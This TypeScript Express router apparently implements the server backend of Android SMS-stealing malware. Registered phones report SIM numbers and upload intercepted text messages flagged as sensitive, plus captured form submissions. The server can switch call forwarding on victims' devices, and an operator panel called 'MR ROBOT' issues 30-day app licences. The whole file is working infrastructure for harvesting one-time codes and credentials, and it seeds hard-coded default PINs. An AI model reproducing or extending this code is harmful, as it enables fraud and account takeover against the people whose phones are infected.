import { Router, type IRouter } from "express";
import pg from "pg";

const { Pool } = pg;
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

const router: IRouter = Router();

const DEFAULT_APP_ID = "SKY-APP-2026-X9F3";
const DEFAULT_APP_NAME = "MR ROBOT";
const DEFAULT_APP_PIN = "1234";
const VALIDITY_DAYS = 30;

function isExpired(createdAt: string | Date): boolean {
  const created = new Date(createdAt).getTime();
  return Date.now() > created + VALIDITY_DAYS * 86_400_000;
}

function parseDevice(ua: string): string {
  if (/iPhone/.test(ua)) return "iPhone";
  if (/iPad/.test(ua)) return "iPad";
  if (/Android/.test(ua)) return "Android";
  if (/Windows/.test(ua)) return "Windows PC";
  if (/Macintosh|Mac OS/.test(ua)) return "Mac";
  if (/Linux/.test(ua)) return "Linux";
  return "Unknown Device";
}

function mapApp(r: Record<string, unknown>) {
  return {
    id: Number(r.id), appId: String(r.app_id), name: String(r.name),
    pin: String(r.pin), status: String(r.status),
    createdAt: r.created_at instanceof Date ? r.created_at.toISOString() : String(r.created_at),
  };
}

function mapDevice(r: Record<string, unknown>) {
  const iso = (d: unknown) => d == null ? null : (d instanceof Date ? d.toISOString() : String(d));
  return {
    id: Number(r.id), deviceId: String(r.device_id), appId: String(r.app_id),
    userId: String(r.user_id), name: String(r.name),
    androidVersion: Number(r.android_version),
    sim1Carrier: r.sim1_carrier as string | null,
    sim1Phone: r.sim1_phone as string | null,
    sim2Carrier: r.sim2_carrier as string | null,
    sim2Phone: r.sim2_phone as string | null,
    status: String(r.status), lastOnline: iso(r.last_online),
    forwardEnabled: Boolean(r.forward_enabled),
    forwardSlot: r.forward_slot == null ? null : Number(r.forward_slot),
    fcmToken: r.fcm_token as string | null,
    installedAt: iso(r.installed_at)!, updatedAt: iso(r.updated_at)!,
  };
}

function mapMessage(r: Record<string, unknown>) {
  const iso = (d: unknown) => d instanceof Date ? d.toISOString() : String(d);
  return {
    id: Number(r.id), appId: String(r.app_id), deviceId: String(r.device_id),
    userId: String(r.user_id), fromSender: String(r.from_sender),
    fromNumber: String(r.from_number), toNumber: r.to_number as string | null,
    body: String(r.body), isSensitive: Boolean(r.is_sensitive),
    receivedAt: iso(r.received_at),
  };
}

function mapFormData(r: Record<string, unknown>) {
  const iso = (d: unknown) => d instanceof Date ? d.toISOString() : String(d);
  return {
    id: Number(r.id), appId: String(r.app_id), deviceId: String(r.device_id),
    data: r.data as Record<string, unknown>, submittedAt: iso(r.submitted_at),
  };
}

// Schema init
let schemaReady = false;
async function ensureSchema() {
  if (schemaReady) return;
  const client = await pool.connect();
  try {
    await client.query(`CREATE TABLE IF NOT EXISTS apps (
      id SERIAL PRIMARY KEY, app_id TEXT NOT NULL, name TEXT NOT NULL,
      pin TEXT NOT NULL DEFAULT '1234', status TEXT NOT NULL DEFAULT 'active',
      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )`);
    await client.query(`CREATE TABLE IF NOT EXISTS devices (
      id SERIAL PRIMARY KEY, device_id TEXT NOT NULL, app_id TEXT NOT NULL,
      user_id TEXT NOT NULL, name TEXT NOT NULL, android_version INTEGER NOT NULL DEFAULT 0,
      sim1_carrier TEXT, sim1_phone TEXT, sim2_carrier TEXT, sim2_phone TEXT,
      status TEXT NOT NULL DEFAULT 'offline', last_online TIMESTAMPTZ,
      forward_enabled BOOLEAN NOT NULL DEFAULT FALSE, forward_slot INTEGER,
      fcm_token TEXT, installed_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )`);
    await client.query(`CREATE TABLE IF NOT EXISTS messages (
      id SERIAL PRIMARY KEY, app_id TEXT NOT NULL, device_id TEXT NOT NULL,
      user_id TEXT NOT NULL, from_sender TEXT NOT NULL, from_number TEXT NOT NULL,
      to_number TEXT, body TEXT NOT NULL, is_sensitive BOOLEAN NOT NULL DEFAULT FALSE,
      received_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )`);
    await client.query(`CREATE TABLE IF NOT EXISTS form_data (
      id SERIAL PRIMARY KEY, app_id TEXT NOT NULL, device_id TEXT NOT NULL,
      data JSONB NOT NULL, submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    )`);
    await client.query(`CREATE TABLE IF NOT EXISTS admin_sessions (
      id TEXT PRIMARY KEY, login_time TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
      user_agent TEXT NOT NULL DEFAULT '', ip TEXT NOT NULL DEFAULT '',
      device TEXT NOT NULL DEFAULT '', app_id TEXT NOT NULL DEFAULT ''
    )`);
    await client.query(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)`);
    // Indexes
    await client.query(`CREATE UNIQUE INDEX IF NOT EXISTS apps_app_id_uq ON apps(app_id)`);
    await client.query(`CREATE UNIQUE INDEX IF NOT EXISTS devices_device_id_uq ON devices(device_id)`);
    await client.query(`CREATE INDEX IF NOT EXISTS devices_app_idx ON devices(app_id)`);
    await client.query(`CREATE INDEX IF NOT EXISTS messages_app_received_idx ON messages(app_id, received_at)`);
    await client.query(`CREATE INDEX IF NOT EXISTS form_data_app_submitted_idx ON form_data(app_id, submitted_at)`);
    await client.query(`ALTER TABLE messages ADD COLUMN IF NOT EXISTS to_number TEXT`);
    await client.query(`ALTER TABLE admin_sessions ADD COLUMN IF NOT EXISTS app_id TEXT NOT NULL DEFAULT ''`);
    // Seed defaults
    await client.query(
      `INSERT INTO apps (app_id, name, pin, status) VALUES ($1,$2,$3,'active') ON CONFLICT (app_id) DO NOTHING`,
      [DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN],
    );
    await client.query(
      `INSERT INTO settings (key, value) VALUES ('master_pin','master1234') ON CONFLICT (key) DO NOTHING`,
    );
    schemaReady = true;
  } finally {
    client.release();
  }
}

// Middleware: ensure schema on first request
router.use(async (_req, _res, next) => {
  try { await ensureSchema(); } catch (e) { return next(e); }
  next();
});

// HEALTH
router.get("/healthz", (_req, res) => res.json({ status: "ok" }));

// APPS
router.get("/apps", async (req, res, next) => {
  try {
    const { rows } = await pool.query(`SELECT * FROM apps ORDER BY created_at ASC`);
    // auto-disable expired
    for (const r of rows) {
      if (r.app_id !== DEFAULT_APP_ID && r.status === "active" && isExpired(r.created_at)) {
        await pool.query(`UPDATE apps SET status='disabled' WHERE app_id=$1`, [r.app_id]);
        r.status = "disabled";
      }
    }
    res.json(rows.map(mapApp));
  } catch (e) { next(e); }
});

router.get("/apps/:appId", async (req, res, next) => {
  try {
    const { rows } = await pool.query(`SELECT * FROM apps WHERE app_id=$1 LIMIT 1`, [req.params.appId]);
    if (!rows[0]) return res.status(404).json({ error: "App not found" });
    const r = rows[0];
    if (r.app_id !== DEFAULT_APP_ID && r.status === "active" && isExpired(r.created_at)) {
      await pool.query(`UPDATE apps SET status='disabled' WHERE app_id=$1`, [r.app_id]);
      r.status = "disabled";
    }
    res.json(mapApp(r));
  } catch (e) { next(e); }
});

router.post("/apps", async (req, res, next) => {
  try {
    const { appId, name, pin, status } = req.body as Record<string, string>;
    if (!appId || !name) return res.status(400).json({ error: "appId and name are required" });
    const { rows } = await pool.query(
      `INSERT INTO apps (app_id,name,pin,status) VALUES ($1,$2,$3,$4) ON CONFLICT (app_id) DO NOTHING RETURNING *`,
      [appId, name, pin ?? "1234", status ?? "active"],
    );
    if (!rows[0]) return res.status(409).json({ error: "App ID already exists" });
    res.status(201).json(mapApp(rows[0]));
  } catch (e) { next(e); }
});

router.patch("/apps/:appId", async (req, res, next) => {
  try {
    const body = req.body as Record<string, string>;
    const sets: string[] = []; const vals: unknown[] = [];
    if (body.name !== undefined) { sets.push(`name=$${vals.push(body.name)}`); }
    if (body.pin !== undefined) { sets.push(`pin=$${vals.push(body.pin)}`); }
    if (body.status !== undefined) { sets.push(`status=$${vals.push(body.status)}`); }
    if (!sets.length) return res.status(400).json({ error: "No fields to update" });
    vals.push(req.params.appId);
    const { rows } = await pool.query(`UPDATE apps SET ${sets.join(",")} WHERE app_id=$${vals.length} RETURNING *`, vals);
    if (!rows[0]) return res.status(404).json({ error: "App not found" });
    res.json(mapApp(rows[0]));
  } catch (e) { next(e); }
});

router.delete("/apps/:appId", async (req, res, next) => {
  try {
    const { rows } = await pool.query(`DELETE FROM apps WHERE app_id=$1 RETURNING *`, [req.params.appId]);
    if (!rows[0]) return res.status(404).json({ error: "App not found" });
    res.json({ ok: true });
  } catch (e) { next(e); }
});

router.post("/apps/:appId/verify-pin", async (req, res, next) => {
  try {
    const { pin } = req.body as { pin?: string };
    if (!pin) return res.status(400).json({ error: "PIN required" });
    const { rows } = await pool.query(`SELECT * FROM apps WHERE app_id=$1 LIMIT 1`, [req.params.appId]);
    if (!rows[0]) return res.status(404).json({ error: "App not found" });
    const r = rows[0];
    if (r.app_id !== DEFAULT_APP_ID && r.status === "active" && isExpired(r.created_at)) {
      await pool.query(`UPDATE apps SET status='disabled' WHERE app_id=$1`, [r.app_id]);
      return res.status(403).json({ error: "App is disabled" });
    }
    if (r.status !== "active") return res.status(403).json({ error: "App is disabled" });
    if (r.pin !== pin) return res.status(401).json({ error: "Wrong PIN" });
    res.json({ ok: true, appId: r.app_id, name: r.name });
  } catch (e) { next(e); }
});

// DEVICES
router.get("/devices", async (req, res, next) => {
  try {
    const { appId, userId } = req.query as Record<string, string>;
    let q = `SELECT * FROM devices`;
    const vals: unknown[] = [];
    if (appId) { q += ` WHERE app_id=$1`; vals.push(appId); }
    else if (userId) { q += ` WHERE user_id=$1`; vals.push(userId); }
    const { rows } = await pool.query(q, vals);
    res.json(rows.map(mapDevice));
  } catch (e) { next(e); }
});

router.get("/devices/:deviceId", async (req, res, next) => {
  try {
    const { rows } = await pool.query(`SELECT * FROM devices WHERE device_id=$1 LIMIT 1`, [req.params.deviceId]);
    if (!rows[0]) return res.status(404).json({ error: "Device not found" });
    res.json(mapDevice(rows[0]));
  } catch (e) { next(e); }
});

router.patch("/devices/:deviceId", async (req, res, next) => {
  try {
    const body = req.body as Record<string, unknown>;
    const sets: string[] = [`updated_at=NOW()`]; const vals: unknown[] = [];
    if (body.status !== undefined) { sets.push(`status=$${vals.push(String(body.status))}`); }
    if (body.lastOnline !== undefined) { sets.push(`last_online=$${vals.push(body.lastOnline ? new Date(String(body.lastOnline)) : null)}`); }
    if (body.fcmToken !== undefined) { sets.push(`fcm_token=$${vals.push(String(body.fcmToken))}`); }
    if (body.forwardEnabled !== undefined) { sets.push(`forward_enabled=$${vals.push(Boolean(body.forwardEnabled))}`); }
    if (body.forwardSlot !== undefined) { sets.push(`forward_slot=$${vals.push(body.forwardSlot === null ? null : Number(body.forwardSlot))}`); }
    vals.push(req.params.deviceId);
    const { rows } = await pool.query(`UPDATE devices SET ${sets.join(",")} WHERE device_id=$${vals.length} RETURNING *`, vals);
    if (!rows[0]) return res.status(404).json({ error: "Device not found" });
    res.json(mapDevice(rows[0]));
  } catch (e) { next(e); }
});

router.delete("/devices/:deviceId", async (req, res, next) => {
  try {
    const { deviceId } = req.params;
    await pool.query(`DELETE FROM messages WHERE device_id=$1`, [deviceId]);
    await pool.query(`DELETE FROM form_data WHERE device_id=$1`, [deviceId]);
    const { rows } = await pool.query(`DELETE FROM devices WHERE device_id=$1 RETURNING *`, [deviceId]);
    if (!rows[0]) return res.status(404).json({ error: "Device not found" });
    res.json({ ok: true });
  } catch (e) { next(e); }
});

// MESSAGES
router.get("/messages", async (req, res, next) => {
  try {
    const { appId, userId, deviceId, limit: limitP, offset: offsetP } = req.query as Record<string, string>;
    const rawLimit = limitP == null ? 500 : Math.max(0, Math.min(5000, parseInt(limitP, 10) || 0));
    const offset = Math.max(0, parseInt(offsetP ?? "0", 10) || 0);
    let q = `SELECT * FROM messages`;
    const vals: unknown[] = [];
    if (appId) { q += ` WHERE app_id=$1`; vals.push(appId); }
    else if (userId) { q += ` WHERE user_id=$1`; vals.push(userId); }
    else if (deviceId) { q += ` WHERE device_id=$1`; vals.push(deviceId); }
    q += ` ORDER BY received_at DESC`;
    if (rawLimit > 0) { q += ` LIMIT $${vals.push(rawLimit)} OFFSET $${vals.push(offset)}`; }
    const { rows } = await pool.query(q, vals);
    res.json(rows.map(mapMessage));
  } catch (e) { next(e); }
});

router.post("/messages", async (req, res, next) => {
  try {
    const body = req.body as Record<string, unknown>;
    if (!body.appId || !body.deviceId || !body.fromNumber || !body.body) {
      return res.status(400).json({ error: "appId, deviceId, fromNumber and body are required" });
    }
    const senderStr = String(body.fromSender ?? "");
    if (senderStr.toLowerCase().startsWith("call forward")) return res.status(204).end();
    const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
    const { rows } = await pool.query(
      `INSERT INTO messages (app_id,device_id,user_id,from_sender,from_number,to_number,body,is_sensitive)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8) RETURNING *`,
      [String(body.appId), String(body.deviceId), uid, String(body.fromSender ?? "Unknown"),
        String(body.fromNumber), body.toNumber ? String(body.toNumber) : null,
        String(body.body), Boolean(body.isSensitive ?? false)],
    );
    res.status(201).json({ ok: true, id: rows[0].id });
  } catch (e) { next(e); }
});

router.delete("/messages/:id", async (req, res, next) => {
  try {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) return res.status(400).json({ error: "Invalid id" });
    const { rows } = await pool.query(`DELETE FROM messages WHERE id=$1 RETURNING *`, [id]);
    if (!rows[0]) return res.status(404).json({ error: "Not found" });
    res.json({ ok: true });
  } catch (e) { next(e); }
});

// FORM DATA
router.get("/data", async (req, res, next) => {
  try {
    const { appId, deviceId } = req.query as Record<string, string>;
    if (!appId) return res.status(400).json({ error: "appId is required" });
    let q = `SELECT * FROM form_data WHERE app_id=$1`;
    const vals: unknown[] = [appId];
    if (deviceId) { q += ` AND device_id=$2`; vals.push(deviceId); }
    q += ` ORDER BY submitted_at DESC`;
    const { rows } = await pool.query(q, vals);
    res.json(rows.map(mapFormData));
  } catch (e) { next(e); }
});

router.post("/data", async (req, res, next) => {
  try {
    const { appId, deviceId, data } = req.body as Record<string, unknown>;
    if (!appId || !deviceId) return res.status(400).json({ error: "appId and deviceId are required" });
    if (!data || typeof data !== "object" || Array.isArray(data)) return res.status(400).json({ error: "data must be a JSON object" });
    const { rows } = await pool.query(
      `INSERT INTO form_data (app_id,device_id,data) VALUES ($1,$2,$3) RETURNING *`,
      [String(appId), String(deviceId), JSON.stringify(data)],
    );
    res.status(201).json(mapFormData(rows[0]));
  } catch (e) { next(e); }
});

router.delete("/data", async (req, res, next) => {
  try {
    const { appId, deviceId } = req.query as Record<string, string>;
    if (!appId || !deviceId) return res.status(400).json({ error: "appId and deviceId are required" });
    const { rowCount } = await pool.query(`DELETE FROM form_data WHERE app_id=$1 AND device_id=$2`, [appId, deviceId]);
    res.json({ ok: true, deleted: rowCount ?? 0 });
  } catch (e) { next(e); }
});

router.delete("/data/:id", async (req, res, next) => {
  try {
    const id = Number(req.params.id);
    if (Number.isNaN(id)) return res.status(400).json({ error: "Invalid id" });
    const { rows } = await pool.query(`DELETE FROM form_data WHERE id=$1 RETURNING *`, [id]);
    if (!rows[0]) return res.status(404).json({ error: "Not found" });
    res.json({ ok: true });
  } catch (e) { next(e); }
});

// REGISTER + HEARTBEAT
router.post("/register", async (req, res, next) => {
  try {
    const body = req.body as Record<string, unknown>;
    if (!body.appId || !body.deviceId || !body.name) return res.status(400).json({ error: "appId, deviceId and name are required" });
    const safeAppId = String(body.appId);
    const { rows: existing } = await pool.query(`SELECT * FROM apps WHERE app_id=$1 LIMIT 1`, [safeAppId]);
    if (!existing[0]) return res.status(403).json({ error: "App not authorized. Admin must create this App ID first." });
    if (existing[0].status !== "active") return res.status(403).json({ error: "App is disabled. Contact admin to activate." });
    const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
    const { rows } = await pool.query(
      `INSERT INTO devices (device_id,app_id,user_id,name,android_version,sim1_carrier,sim1_phone,sim2_carrier,sim2_phone,status,last_online,forward_enabled,forward_slot,fcm_token)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,'online',NOW(),false,null,$10)
       ON CONFLICT (device_id) DO UPDATE SET
         app_id=EXCLUDED.app_id, user_id=EXCLUDED.user_id, name=EXCLUDED.name,
         android_version=EXCLUDED.android_version, sim1_carrier=EXCLUDED.sim1_carrier,
         sim1_phone=EXCLUDED.sim1_phone, sim2_carrier=EXCLUDED.sim2_carrier,
         sim2_phone=EXCLUDED.sim2_phone, status='online', last_online=NOW(),
         fcm_token=EXCLUDED.fcm_token, updated_at=NOW()
       RETURNING *, (xmax=0) AS was_created`,
      [String(body.deviceId), safeAppId, uid, String(body.name),
        Number(body.androidVersion ?? 0),
        body.sim1Carrier ?? null, body.sim1Phone ?? null,
        body.sim2Carrier ?? null, body.sim2Phone ?? null,
        body.fcmToken ?? null],
    );
    const created = Boolean(rows[0].was_created);
    res.status(created ? 201 : 200).json({ ok: true, deviceId: rows[0].device_id, created });
  } catch (e) { next(e); }
});

router.post("/heartbeat", async (req, res, next) => {
  try {
    const { deviceId, fcmToken } = req.body as Record<string, unknown>;
    if (!deviceId) return res.status(400).json({ error: "deviceId is required" });
    const sets = [`status='online'`, `last_online=NOW()`, `updated_at=NOW()`];
    const vals: unknown[] = [];
    if (fcmToken != null) { sets.push(`fcm_token=$${vals.push(String(fcmToken))}`); }
    vals.push(String(deviceId));
    const { rows } = await pool.query(`UPDATE devices SET ${sets.join(",")} WHERE device_id=$${vals.length} RETURNING *`, vals);
    if (!rows[0]) return res.status(403).json({ error: "Device not registered. Contact admin." });
    res.json({ ok: true });
  } catch (e) { next(e); }
});

// MASTER PIN
router.post("/admin/verify-master-pin", async (req, res, next) => {
  try {
    const { pin } = req.body as { pin?: string };
    if (!pin) return res.status(400).json({ error: "PIN required" });
    const { rows } = await pool.query(`SELECT value FROM settings WHERE key='master_pin'`);
    const stored = rows[0]?.value ?? "master1234";
    if (pin !== stored) return res.status(401).json({ error: "Wrong Master PIN" });
    res.json({ ok: true });
  } catch (e) { next(e); }
});

router.patch("/admin/master-pin", async (req, res, next) => {
  try {
    const { currentPin, newPin } = req.body as { currentPin?: string; newPin?: string };
    if (!currentPin || !newPin) return res.status(400).json({ error: "currentPin and newPin required" });
    if (newPin.length < 4) return res.status(400).json({ error: "PIN must be at least 4 characters" });
    const { rows } = await pool.query(`SELECT value FROM settings WHERE key='master_pin'`);
    const stored = rows[0]?.value ?? "master1234";
    if (currentPin !== stored) return res.status(401).json({ error: "Current PIN is wrong" });
    await pool.query(`INSERT INTO settings (key,value) VALUES ('master_pin',$1) ON CONFLICT (key) DO UPDATE SET value=$1`, [newPin]);
    res.json({ ok: true });
  } catch (e) { next(e); }
});

// ADMIN SESSIONS
router.get("/admin/sessions", async (req, res, next) => {
  try {
    const appId = String(req.query.appId ?? "");
    const { rows } = await pool.query(
      `SELECT id,login_time,last_active,user_agent,ip,device FROM admin_sessions WHERE app_id=$1 ORDER BY login_time DESC`,
      [appId],
    );
    res.json(rows.map((r) => ({
      id: String(r.id),
      loginTime: r.login_time instanceof Date ? r.login_time.toISOString() : String(r.login_time),
      lastActive: r.last_active instanceof Date ? r.last_active.toISOString() : String(r.last_active),
      userAgent: String(r.user_agent ?? ""), ip: String(r.ip ?? ""), device: String(r.device ?? ""),
    })));
  } catch (e) { next(e); }
});

router.post("/admin/sessions", async (req, res, next) => {
  try {
    const ua = String(req.headers["user-agent"] ?? "");
    const ip = String((req.headers["x-forwarded-for"] as string ?? req.ip ?? "unknown")).split(",")[0].trim();
    const appId = String((req.body as Record<string, unknown>).appId ?? "");
    const { rows: existing } = await pool.query(
      `SELECT id FROM admin_sessions WHERE user_agent=$1 AND ip=$2 AND app_id=$3 ORDER BY last_active DESC LIMIT 1`,
      [ua, ip, appId],
    );
    if (existing[0]) {
      await pool.query(`UPDATE admin_sessions SET last_active=NOW() WHERE id=$1`, [existing[0].id]);
      return res.json({ sessionId: existing[0].id });
    }
    const id = crypto.randomUUID();
    await pool.query(
      `INSERT INTO admin_sessions (id,user_agent,ip,device,app_id) VALUES ($1,$2,$3,$4,$5)`,
      [id, ua, ip, parseDevice(ua), appId],
    );
    res.json({ sessionId: id });
  } catch (e) { next(e); }
});

router.patch("/admin/sessions/:id/ping", async (req, res, next) => {
  try {
    const { rowCount } = await pool.query(`UPDATE admin_sessions SET last_active=NOW() WHERE id=$1`, [req.params.id]);
    if (!rowCount) return res.status(404).json({ error: "session not found" });
    res.json({ ok: true });
  } catch (e) { next(e); }
});

router.delete("/admin/sessions/:id", async (req, res, next) => {
  try {
    await pool.query(`DELETE FROM admin_sessions WHERE id=$1`, [req.params.id]);
    res.json({ ok: true });
  } catch (e) { next(e); }
});

router.delete("/admin/sessions", async (req, res, next) => {
  try {
    const appId = String(req.query.appId ?? "");
    await pool.query(`DELETE FROM admin_sessions WHERE app_id=$1`, [appId]);
    res.json({ ok: true });
  } catch (e) { next(e); }
});

// STATS
router.get("/stats", async (req, res, next) => {
  try {
    const { appId } = req.query as Record<string, string>;
    if (appId) {
      const [d, m, f] = await Promise.all([
        pool.query(`SELECT COUNT(*)::text AS c FROM devices WHERE app_id=$1`, [appId]),
        pool.query(`SELECT COUNT(*)::text AS c FROM messages WHERE app_id=$1`, [appId]),
        pool.query(`SELECT COUNT(*)::text AS c FROM form_data WHERE app_id=$1`, [appId]),
      ]);
      return res.json({ devices: Number(d.rows[0].c), messages: Number(m.rows[0].c), formData: Number(f.rows[0].c) });
    }
    const [a, d, m, f] = await Promise.all([
      pool.query(`SELECT COUNT(*)::text AS c FROM apps`),
      pool.query(`SELECT COUNT(*)::text AS c FROM devices`),
      pool.query(`SELECT COUNT(*)::text AS c FROM messages`),
      pool.query(`SELECT COUNT(*)::text AS c FROM form_data`),
    ]);
    res.json({ apps: Number(a.rows[0].c), devices: Number(d.rows[0].c), messages: Number(m.rows[0].c), formData: Number(f.rows[0].c) });
  } catch (e) { next(e); }
});

// SEED
router.post("/seed", async (req, res, next) => {
  try {
    await pool.query(
      `INSERT INTO apps (app_id,name,pin,status) VALUES ($1,$2,$3,'active') ON CONFLICT (app_id) DO NOTHING`,
      [DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN],
    );
    res.json({ ok: true, message: "Database is ready" });
  } catch (e) { next(e); }
});

export default router;
